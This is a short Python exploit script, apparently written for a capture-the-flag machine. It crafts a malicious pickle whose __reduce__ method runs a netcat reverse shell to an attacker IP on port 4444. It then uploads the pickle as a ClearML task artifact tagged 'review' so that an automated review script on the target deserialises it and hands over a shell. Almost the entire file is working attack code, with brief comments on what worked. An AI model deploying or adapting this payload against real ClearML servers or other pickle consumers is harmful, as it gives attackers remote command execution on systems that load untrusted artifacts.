import pickle
import os

#Define class to instantiate inside of dictionary when called in the artifact_object (reduce self is needed for exploit) 
class RunCommand:
    def __reduce__(self):
        #Normal bash tcp shell would not work, netcat shell did work
        return (os.system, ('nc 10.10.14.63 4444 -e /bin/bash',))
        
command = { 'test' : RunCommand() }

#Ultimately not needed as command passed directly into object called by GET method in JSON script
with open('netcat.pkl', 'wb') as f:
    pickle.dump(command, f)
    
from clearml import Task

 #Remember to add tags='review' so artifact_object gets caught by the JSON review scripts from Chad Jippity  
task = Task.init(project_name='Black Swan', task_name='Review JSON Artifacts', task_type=Task.TaskTypes.data_processing, tags='review', output_uri=True)
#Placed command dicationary directly into artifact_object instead of using the actual malicious .pkl file
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")

